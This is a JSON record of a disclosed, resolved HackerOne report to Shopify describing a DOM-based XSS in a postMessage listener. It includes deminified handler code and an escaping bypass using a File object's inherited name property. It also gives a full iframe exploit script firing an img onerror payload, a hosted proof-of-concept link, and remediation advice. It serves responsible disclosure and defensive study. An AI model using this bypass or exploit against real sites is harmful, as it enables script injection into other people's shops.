{
  "id": 231053,
  "global_id": "Z2lkOi8vaGFja2Vyb25lL1JlcG9ydC8yMzEwNTM=",
  "url": "https://hackerone.com/reports/231053",
  "title": "XSS on any Shopify shop via abuse of the HTML5 structured clone algorithm in postMessage listener on \"/:id/digital_wallets/dialog\"",
  "state": "Closed",
  "substate": "resolved",
  "readable_substate": "Resolved",
  "created_at": "2017-05-23T09:55:08.696Z",
  "submitted_at": "2017-05-23T09:55:08.696Z",
  "is_member_of_team?": false,
  "is_organization_group_member?": false,
  "reporter": {
    "disabled": false,
    "username": "bored-engineer",
    "url": "/bored-engineer",
    "profile_picture_urls": {
      "small": "https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/variants/xh0k94drzpd2d2z4bz9b1kbzngbh/3c7b305354c9073c106ae3d1701798defaaf5be844fb8fdfa49ca62f991a2c2c?response-content-disposition=inline%3B%20filename%3D%22IMG_0330%20%25281%2529.jpg%22%3B%20filename%2A%3DUTF-8%27%27IMG_0330%2520%25281%2529.jpg&response-content-type=image%2Fjpeg&X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=ASIAQGK6FURQ2TXGU4NH%2F20240213%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20240213T124249Z&X-Amz-Expires=1586&X-Amz-Security-Token=IQoJb3JpZ2luX2VjEJf%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJHMEUCIQCZXXLTvdjrV9%2BXTrnagiitpTSxdTNfuwI8JoO87a374wIgGdKdQ7YeIephBMysf3wfpXJkd8udROvqz%2BslCFnteH4qsgUIcBADGgwwMTM2MTkyNzQ4NDkiDJwtqkOHj%2Bhq7hwpISqPBc3oQJzChWjZ7bKD%2BccTmt7LiDYwnp%2FaW49dMRirZ9pIhrCa7YZHTLZ9RBv6n9DI4zg1cmDjgAWLZcLoHEU6HMSY4TZiQ6JhkTxfHY9%2BW8gIq%2FN6zwvc28EGhPI0bXtMQ05CUe9qLU1IqB2QvVi8ljbC0OENAKpHHW%2B4HZPV3ya4m4CUrmIsBEz02u4o%2FTUWBucXelW27TA%2FMHkcbbkFDMVuk57DqG9l6DCv91Gk0it2LxC7b8QipHE3PIzezn29GFbq0x%2FVAy8j5zhCsVA2u3PoLG8UBgJPigFlduO2n54cymHx0Kj1lPCf0XySDYAG7J%2BkbE9frSbqOenAzEKHL%2BbmTLbvIknLt0tHuWNofydq3sKSVRJUGT6kPaXiG6LcZZAjiidzALZPhPiZjjN2NFbT%2B4d3bYuhSBgSzvUsrX%2FU4t82le3n50YJtFXVQ5QFh1yFj%2BasAJo8gy4CzSP0PgdMEiJHxmad%2BFSBk1osw1BNlolWVHoYfecAbexOr2DelWZtvQEFGBxOieL0Wu0EoUhoxEA%2BwcuNd421R9g0jkhW6T1utyXajONBgYVseJBpWnbW%2BkpGImvblpF9NqajpVHpAAFM6sdMLqiQfJ1f2k9nfS8NIMIMr1C%2Fow0E8D%2FBak4EhkqC2z4QmLpn0zQ7nAVSDGC0pvQQ9HVPj%2BqgNB88SHK9rHZSyCSKf4lsEvYbKl40pk9%2FwaWVlfLBHZ9KQh3Sk5kHWBptfVKftWPHgl3kdZnZZoD7zq5BIGAq%2BfkhmJ1PLAj9CcRgLZKxPmL7BwBfMK1j9GipZrFsKu100o2ehZDw7ycR0yKIZpB5BsA2SMtYyPB%2B8lmSAWsiEcgvv%2BCmvle2pB9btBCR6tP%2FsVAwuKWsrgY6sQEOW7UlyhlECgHHWSD1IxQaKIHYvjLM%2FfiTluais8DBgTs2%2B0ozGJfGCvvwGwuCx3AVFBMiYmPRly4WjCK3xXERtAap5VTGJE61OwLy5AbGPGJEzLPgyw2xUSEbhOBlNW9NWCeq3J6Ykb0rxTuobAmesQY2%2FdIFblQ%2FHHBqxCz3Wf7QF6oiRaFXn07SukEwJwLzpGlJ6GkqAxZz63CXWtQishvehwDUwbs0xamAMs2tYiU%3D&X-Amz-SignedHeaders=host&X-Amz-Signature=aa8ec05e9be68e214f3ad0cdb48cdd82f64ba96e2f71bc1111544a900ce32c95"
    },
    "is_me?": false,
    "cleared": false,
    "verified": false,
    "hackerone_triager": false,
    "hacker_mediation": false
  },
  "team": {
    "id": 1382,
    "url": "https://hackerone.com/shopify",
    "handle": "shopify",
    "profile_picture_urls": {
      "small": "https://profile-photos.hackerone-user-content.com/variants/fjjiC5585s8WoDGHv2M5okbJ/3c7b305354c9073c106ae3d1701798defaaf5be844fb8fdfa49ca62f991a2c2c",
      "medium": "https://profile-photos.hackerone-user-content.com/variants/fjjiC5585s8WoDGHv2M5okbJ/f4a495c04fdb224bac8ec64587537e511aa8c4925e7955bee0a19e0ed7d891dc"
    },
    "permissions": [],
    "submission_state": "open",
    "default_currency": "usd",
    "awards_miles": false,
    "offers_bounties": true,
    "state": "public_mode",
    "only_cleared_hackers": false,
    "pentest_feature_enabled?": false,
    "profile": {
      "name": "Shopify",
      "twitter_handle": "",
      "website": "https://www.shopify.com",
      "about": "Shopify is a multi-channel commerce platform that helps people sell online, in-store, and everywhere in between."
    }
  },
  "has_bounty?": true,
  "in_validation?": false,
  "can_view_team": true,
  "can_view_report": true,
  "is_external_bug": false,
  "is_published": false,
  "is_participant": false,
  "has_collaborators": false,
  "submitted_by_team_member": false,
  "stage": 4,
  "public": true,
  "visibility": "full",
  "cve_ids": [],
  "singular_disclosure_disabled": true,
  "disclosed_at": "2017-05-30T17:10:05.272Z",
  "bug_reporter_agreed_on_going_public_at": "2017-05-30T17:10:05.220Z",
  "team_member_agreed_on_going_public_at": "2017-05-29T17:26:17.702Z",
  "comments_closed?": false,
  "facebook_team?": false,
  "team_private?": false,
  "vulnerability_information": "# Description\nThe `/:id/digital_wallets/dialog` endpoint is used to display a small dialog box relating to the \"digital wallets\" functionality on a shop. The endpoint includes a script that listens for postMessages without validating the origin of messages. However, the impact of the missing validation is very limited because the script attempts to escape any content to prevent any HTML injection. By sending a specially crafted postMessage containing a \"clone-able\" object (per the [HTML5 structured clone algorithm](https://developer.mozilla.org/en-US/docs/Web/API/Web_Workers_API/Structured_clone_algorithm)) this escaping can be bypassed allowing a malicious actor to obtain XSS. \n\n# Technical Background\nNote: For the sake of clarity I've renamed some of the variables and re-written sections of code to only include the relevant functions from [the minified JavaScript](https://cdn.shopify.com/s/assets/services/digital_wallets/scripts-e4c6841a7e9dfd3216a6cc52da1313648ea3b449f388411eac2f260b3f7f36f6.js) so this report is easier to understand...\nThe [/:id/digital_wallets/dialog](https://bored-engineering-whitehat-2.myshopify.com/1337/digital_wallets/dialog) route initializes a postMessage listener on page load that looks like this:\n```js\nthis._messageHandler = function(event) {\n  if (event.data) {\n    if (event.data.type && event.data.digitalWalletsDialog) {\n      c(i, event.data.type, event.data.payload);\n    }\n  }\n}\nthis._localWindow.addEventListener(\"message\", this._messageHandler)\n```\nThe `c` function which handles the message is responsible for a few different message types, in this case we're only interested in the `DigitalWalletsDialog:change` type:\n```js\nfunction c(inst, type, payload) {\n  switch (type) {\n    case ze.DIALOG_CHANGE: // DigitalWalletsDialog:change\n      if (d(payload)) { // Check that the required fields are present\n        g(inst) // Reset the DOM\n        p(inst, payload) // Insert the payload into the DOM\n...\n```\nAs noted in my previous comments the `d` function and `g` function are relatively straightforward and un-interesting:\n```js\nfunction d(payload) {\n  var required = [\"title\", \"button\"]\n  for (var idx = 0; idx < required.length; idx++)\n    if (!payload[required[idx]] || \"\" === !payload[required[idx]]) {\n      return false\n    }\n    return true\n}\nfunction g(inst) {\n  for (var idx in inst.customizableElements) {\n    inst.customizableElements[idx].innerHTML = \"\"\n    inst.customizableElements[idx].classList.remove(\"hidden\")\n  }\n  inst.customizableElements.errorList.scrollTop = 0\n}\n```\nUnderstanding all of the previous pieces, we can pass a legitimate message through the functions like so:\n```js\nwindow.postMessage({\n  type: \"DigitalWalletsDialog:change\",\n  digitalWalletsDialog: true,\n  payload: {\n    title: \"placeholder\",\n    button: \"placeholder\"\n  },\n}, \"*\");\n```\nAnd when we do the dialog renders as expected:\n{F187323}\nLooking more into the `p` function we see it is responsible for setting/creating the values for a number of elements on the DOM:\n```js\nfunction p(inst, payload) {\n  _(inst, t.icon)\n  v(inst, \"title\", payload.title)\n  if (payload.errors) {\n    if (Array.isArray(payload.errors)) {\n      if (payload.errors.length > 1) {\n        v(inst, \"errorList\", h(payload.errors))\n        inst.customizableElements.errorDescription.classList.add(\"hidden\")\n        inst.staticElements.errorListContainer.classList.remove(\"hidden\")\n      } else {\n        v(inst, \"errorDescription\", payload.errors[0])\n        inst.staticElements.errorListContainer.classList.add(\"hidden\")\n      }\n    } else { \n      e.customizableElements.errorDescription.classList.add(\"hidden\")\n    }\n  }\n  if (payload.lineItems) {\n    v(inst, \"errorList\", f(payload.lineItems)) \n    inst.staticElements.errorListContainer.classList.remove(\"hidden\")\n    v(inst, \"dismissButton\", payload.button || \"Close\")\n  }\n}\n```\nThe part we're going to focus on is the `payload.lineItems` handling. The items are passed into the `f` function which is defined as follows:\n```js\nfunction f(payload) {\n  var table = document.createElement(\"table\")\n  table.className = \"product-table\"\n  table.id = \"dialog__product-table\"\n  table.innerHTML = T // <thead><tr>...\n  payload.forEach(function(lineItem) {\n    table.tBodies[0].innerHTML += m(lineItem)\n  })\n  return table\n}\n```\nIt appears that function creates a table for each `lineItem` rendering them with the `m` function:\n```js\nfunction m(payload) {\n  var escaped = u(payload)\n  if (escaped.variant) {\n    return '\\n      <span class=\"product__description__variant order-summary__small-text\">\\n        ' + escaped.variant + \"\\n      </span>\"\n  }\n  return '\\n    <tr class=\"product\">\\n      <td class=\"product__image\">\\n        <div class=\"product-thumbnail\">\\n          <div class=\"product-thumbnail__wrapper\">\\n            <img alt=\"' + t.name + '\" class=\"product-thumbnail__image\" src=\"' + t.image + '\">\\n          </div>\\n          <span class=\"product-thumbnail__quantity\" aria-hidden=\"true\">' + t.amount + '</span>\\n        </div>\\n      </td>\\n      <td class=\"product__description\">\\n        <span class=\"product__description__name order-summary__emphasis\">' + t.name + \"</span>\\n        \" + n + '\\n      </td>\\n      <td class=\"product__quantity visually-hidden\">' + t.amount + '</td>\\n      <td class=\"product__status product__status--sold-out\">' + t.message + \"</td>\\n    </tr>\\n  \"\n}\n``` \nAnd again we can verify this assumption by testing it:\n```\nwindow.postMessage({\n  type: \"DigitalWalletsDialog:change\",\n  digitalWalletsDialog: true,\n  payload: {\n    title: \"placeholder\",\n    button: \"placeholder\",\n    lineItems: [{\n      name: \"product\",\n      amount: \"$13.37\",\n      message: \"added to cart\"\n    }],\n  },\n}, \"*\");\n```\nAnd we get the expected result:\n{F187326}\n\n# Technical Details\nSo now that we have an idea of how the functions behave under normal usage, lets examine how we can exploit them...\nThe main function we're interested in here is the `u` which handles escaping all attributes on the payload:\n```js\nfunction u(payload) {\n  for (var idx in payload) {\n    if (payload.hasOwnProperty(idx)) {\n      payload[idx] = Ve.escapeHtml(payload[idx]);\n    }\n  }\n  return payload;\n}\n```\nNow if we assume that `escapeHtml` function does not have any issues/bypasses, we can observe something interesting: The function does not create a \"new\" escaped object, instead it over-writes properties of the existing object. This means that if we are able to create an object with a controlled property that does not respond to `hasOwnProperty` it will not be escaped. We can test this locally:\n```js\n// Expected to fail:\nresult = u({\n  message: \"'\\\"<b>\\\\\"\n});\nresult.message // \"&#39;&quot;&lt;b&gt;\\\"\n// Bypassed:\nresult = u(new Error(\"'\\\"<b>\\\\\"));\nresult.message; // \"'\"<b>\\\"\n```\nThis is great, but in practice we're limited to only a few properties that are actually accessed by the HTML template:\n\n* `variant`\n* `name`\n* `image`\n* `message`\n\nAdditionally, we're limited to only objects which can be passed over postMessage, for example we can't use the [Error](https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Global_Objects/Error) object which already has a `message` attribute. The list of allowed objects for postMessage is defined as part of the [HTML5 structured clone algorithm](https://developer.mozilla.org/en-US/docs/Web/API/Web_Workers_API/Structured_clone_algorithm).\n\nAfter a bit of experimentation with each of them, it looks like the [File](https://developer.mozilla.org/en-US/docs/Web/API/File) object is perfect for this exploit as it has a read-only `name` property which is used by our template. We can test it out like so:\n```js\nlet f = new File([\"data\"], \"controlledvalue\");\nf.name; // \"controlledvalue\"\nf.hasOwnProperty(\"name\"); // false\n```\nPutting this all together with an iframe to make it clean we get the final exploit:\n```js\nlet shop = prompt(\"Enter a Target Shop URL:\", \"https://bored-engineering-whitehat-2.myshopify.com\");\nlet frame = document.createElement(\"iframe\");\nframe.src = `${shop}/1337/digital_wallets/dialog`;\nframe.style.display = \"none\";\nframe.onload = () => {\n  frame.contentWindow.postMessage({\n    type: \"DigitalWalletsDialog:change\",\n    digitalWalletsDialog: true,\n    payload: {\n      title: \"placeholder\",\n      button: \"placeholder\",\n      lineItems: [new File([\"\"], \"<img src=xx: onerror=alert(document.domain)>\")],\n    },\n  }, \"*\");\n}\ndocument.body.appendChild(frame);\n```\n\n# Exploitability\nAs shown in the proof of concept below, the exploit can be hidden in an iframe and requires no user interaction what-so-ever. Additionally, it appears to affect every Shopify shop. With that said, the injection occurs within the `/:id/digital_wallets/dialog` route which is not under `/admin`, though at this point in time it would be trivial to escalate that access to the `/admin` route. \n\n# Proof of Concept\nI've hosted a simple PoC at [https://attackerdoma.in/de43386b-cbea-4427-89f7-90e269b9b72a.html](https://attackerdoma.in/de43386b-cbea-4427-89f7-90e269b9b72a.html).\n\n# Remediation\nThis issue could be fixed either within the `u` function, or by preventing anything except primitives from being passed over the postMessage channel. Typically this is accomplished by running `JSON.parse` on the message, and exiting the handling if parsing fails. ",
  "bounty_amount": "3000.0",
  "formatted_bounty": "$3,000",
  "weakness": {
    "id": 63,
    "name": "Cross-site Scripting (XSS) - DOM"
  },
  "original_report_id": null,
  "original_report_url": null,
  "attachments": [
    {
      "id": 187323,
      "file_name": "Screen_Shot_2017-05-23_at_2.18.44_AM.png",
      "expiring_url": "https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/000/187/323/a9ce0d995d209aa7009a5b3ab3951b2173c63835/Screen_Shot_2017-05-23_at_2.18.44_AM.png?response-content-disposition=attachment%3B%20filename%3D%22Screen_Shot_2017-05-23_at_2.18.44_AM.png%22%3B%20filename%2A%3DUTF-8%27%27Screen_Shot_2017-05-23_at_2.18.44_AM.png&response-content-type=image%2Fpng&X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=ASIAQGK6FURQ2TXGU4NH%2F20240213%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20240213T124249Z&X-Amz-Expires=1586&X-Amz-Security-Token=IQoJb3JpZ2luX2VjEJf%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJHMEUCIQCZXXLTvdjrV9%2BXTrnagiitpTSxdTNfuwI8JoO87a374wIgGdKdQ7YeIephBMysf3wfpXJkd8udROvqz%2BslCFnteH4qsgUIcBADGgwwMTM2MTkyNzQ4NDkiDJwtqkOHj%2Bhq7hwpISqPBc3oQJzChWjZ7bKD%2BccTmt7LiDYwnp%2FaW49dMRirZ9pIhrCa7YZHTLZ9RBv6n9DI4zg1cmDjgAWLZcLoHEU6HMSY4TZiQ6JhkTxfHY9%2BW8gIq%2FN6zwvc28EGhPI0bXtMQ05CUe9qLU1IqB2QvVi8ljbC0OENAKpHHW%2B4HZPV3ya4m4CUrmIsBEz02u4o%2FTUWBucXelW27TA%2FMHkcbbkFDMVuk57DqG9l6DCv91Gk0it2LxC7b8QipHE3PIzezn29GFbq0x%2FVAy8j5zhCsVA2u3PoLG8UBgJPigFlduO2n54cymHx0Kj1lPCf0XySDYAG7J%2BkbE9frSbqOenAzEKHL%2BbmTLbvIknLt0tHuWNofydq3sKSVRJUGT6kPaXiG6LcZZAjiidzALZPhPiZjjN2NFbT%2B4d3bYuhSBgSzvUsrX%2FU4t82le3n50YJtFXVQ5QFh1yFj%2BasAJo8gy4CzSP0PgdMEiJHxmad%2BFSBk1osw1BNlolWVHoYfecAbexOr2DelWZtvQEFGBxOieL0Wu0EoUhoxEA%2BwcuNd421R9g0jkhW6T1utyXajONBgYVseJBpWnbW%2BkpGImvblpF9NqajpVHpAAFM6sdMLqiQfJ1f2k9nfS8NIMIMr1C%2Fow0E8D%2FBak4EhkqC2z4QmLpn0zQ7nAVSDGC0pvQQ9HVPj%2BqgNB88SHK9rHZSyCSKf4lsEvYbKl40pk9%2FwaWVlfLBHZ9KQh3Sk5kHWBptfVKftWPHgl3kdZnZZoD7zq5BIGAq%2BfkhmJ1PLAj9CcRgLZKxPmL7BwBfMK1j9GipZrFsKu100o2ehZDw7ycR0yKIZpB5BsA2SMtYyPB%2B8lmSAWsiEcgvv%2BCmvle2pB9btBCR6tP%2FsVAwuKWsrgY6sQEOW7UlyhlECgHHWSD1IxQaKIHYvjLM%2FfiTluais8DBgTs2%2B0ozGJfGCvvwGwuCx3AVFBMiYmPRly4WjCK3xXERtAap5VTGJE61OwLy5AbGPGJEzLPgyw2xUSEbhOBlNW9NWCeq3J6Ykb0rxTuobAmesQY2%2FdIFblQ%2FHHBqxCz3Wf7QF6oiRaFXn07SukEwJwLzpGlJ6GkqAxZz63CXWtQishvehwDUwbs0xamAMs2tYiU%3D&X-Amz-SignedHeaders=host&X-Amz-Signature=e5c8ae25beb1879c61604b0f4190ad5b7c921b0d3ff3351c3142eb678a4c50cf",
      "file_size": 37657,
      "type": "image/png",
      "moderated": null
    },
    {
      "id": 187326,
      "file_name": "Screen_Shot_2017-05-23_at_2.24.34_AM.png",
      "expiring_url": "https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/000/187/326/a896e551f4f0d07897a3e55daaa84baeaace9076/Screen_Shot_2017-05-23_at_2.24.34_AM.png?response-content-disposition=attachment%3B%20filename%3D%22Screen_Shot_2017-05-23_at_2.24.34_AM.png%22%3B%20filename%2A%3DUTF-8%27%27Screen_Shot_2017-05-23_at_2.24.34_AM.png&response-content-type=image%2Fpng&X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=ASIAQGK6FURQ2TXGU4NH%2F20240213%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20240213T124249Z&X-Amz-Expires=1586&X-Amz-Security-Token=IQoJb3JpZ2luX2VjEJf%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJHMEUCIQCZXXLTvdjrV9%2BXTrnagiitpTSxdTNfuwI8JoO87a374wIgGdKdQ7YeIephBMysf3wfpXJkd8udROvqz%2BslCFnteH4qsgUIcBADGgwwMTM2MTkyNzQ4NDkiDJwtqkOHj%2Bhq7hwpISqPBc3oQJzChWjZ7bKD%2BccTmt7LiDYwnp%2FaW49dMRirZ9pIhrCa7YZHTLZ9RBv6n9DI4zg1cmDjgAWLZcLoHEU6HMSY4TZiQ6JhkTxfHY9%2BW8gIq%2FN6zwvc28EGhPI0bXtMQ05CUe9qLU1IqB2QvVi8ljbC0OENAKpHHW%2B4HZPV3ya4m4CUrmIsBEz02u4o%2FTUWBucXelW27TA%2FMHkcbbkFDMVuk57DqG9l6DCv91Gk0it2LxC7b8QipHE3PIzezn29GFbq0x%2FVAy8j5zhCsVA2u3PoLG8UBgJPigFlduO2n54cymHx0Kj1lPCf0XySDYAG7J%2BkbE9frSbqOenAzEKHL%2BbmTLbvIknLt0tHuWNofydq3sKSVRJUGT6kPaXiG6LcZZAjiidzALZPhPiZjjN2NFbT%2B4d3bYuhSBgSzvUsrX%2FU4t82le3n50YJtFXVQ5QFh1yFj%2BasAJo8gy4CzSP0PgdMEiJHxmad%2BFSBk1osw1BNlolWVHoYfecAbexOr2DelWZtvQEFGBxOieL0Wu0EoUhoxEA%2BwcuNd421R9g0jkhW6T1utyXajONBgYVseJBpWnbW%2BkpGImvblpF9NqajpVHpAAFM6sdMLqiQfJ1f2k9nfS8NIMIMr1C%2Fow0E8D%2FBak4EhkqC2z4QmLpn0zQ7nAVSDGC0pvQQ9HVPj%2BqgNB88SHK9rHZSyCSKf4lsEvYbKl40pk9%2FwaWVlfLBHZ9KQh3Sk5kHWBptfVKftWPHgl3kdZnZZoD7zq5BIGAq%2BfkhmJ1PLAj9CcRgLZKxPmL7BwBfMK1j9GipZrFsKu100o2ehZDw7ycR0yKIZpB5BsA2SMtYyPB%2B8lmSAWsiEcgvv%2BCmvle2pB9btBCR6tP%2FsVAwuKWsrgY6sQEOW7UlyhlECgHHWSD1IxQaKIHYvjLM%2FfiTluais8DBgTs2%2B0ozGJfGCvvwGwuCx3AVFBMiYmPRly4WjCK3xXERtAap5VTGJE61OwLy5AbGPGJEzLPgyw2xUSEbhOBlNW9NWCeq3J6Ykb0rxTuobAmesQY2%2FdIFblQ%2FHHBqxCz3Wf7QF6oiRaFXn07SukEwJwLzpGlJ6GkqAxZz63CXWtQishvehwDUwbs0xamAMs2tYiU%3D&X-Amz-SignedHeaders=host&X-Amz-Signature=42da7fbb679ea59bef3daf61f3d24f8ea538fd17a9fcf409d6c9eac75ab1ea70",
      "file_size": 55557,
      "type": "image/png",
      "moderated": null
    }
  ],
  "allow_singular_disclosure_at": null,
  "vote_count": 112,
  "voters": [
    "manoelt",
    "mattibijnens",
    "jin",
    "flamezzz",
    "arneswinnen",
    "drsniper",
    "tomdev",
    "sp1d3rs",
    "cdl",
    "ramsexy",
    "and 102 more..."
  ],
  "structured_scope": null,
  "abilities": {
    "assignable_team_members": [],
    "assignable_team_member_groups": []
  },
  "summaries": [
    {
      "id": 4248,
      "category": "team",
      "content": "This issue is a XSS affecting all Shopify stores that can be triggered via `windows.postMessage` from any remote origin. The report demonstrated a clever bypass of the escaping code we had in place to prevent code injection.",
      "user": {
        "id": 19168,
        "username": "francoischagnon",
        "name": "Francois Chagnon",
        "bio": "",
        "cleared": false,
        "verified": false,
        "website": "",
        "location": "",
        "created_at": "2015-03-19T21:06:55.673Z",
        "url": "https://hackerone.com/francoischagnon",
        "hackerone_triager": false,
        "hackerone_employee": false,
        "user_type": "company",
        "profile_picture_urls": {
          "small": "https://profile-photos.hackerone-user-content.com/variants/000/019/168/5d577fe97283a5483331257b629b6287ed4d287b_original.jpg/3c7b305354c9073c106ae3d1701798defaaf5be844fb8fdfa49ca62f991a2c2c",
          "medium": "https://profile-photos.hackerone-user-content.com/variants/000/019/168/5d577fe97283a5483331257b629b6287ed4d287b_original.jpg/f4a495c04fdb224bac8ec64587537e511aa8c4925e7955bee0a19e0ed7d891dc",
          "xtralarge": "https://profile-photos.hackerone-user-content.com/variants/000/019/168/5d577fe97283a5483331257b629b6287ed4d287b_original.jpg/114764ec8f01b1a3e153599212c9f011fb3b0bce3a4fdc1f9a3c551f8c94acf8"
        }
      },
      "can_view?": true,
      "can_create?": false,
      "attachments": []
    },
    {
      "category": "researcher",
      "can_view?": true,
      "can_create?": false
    }
  ]
}
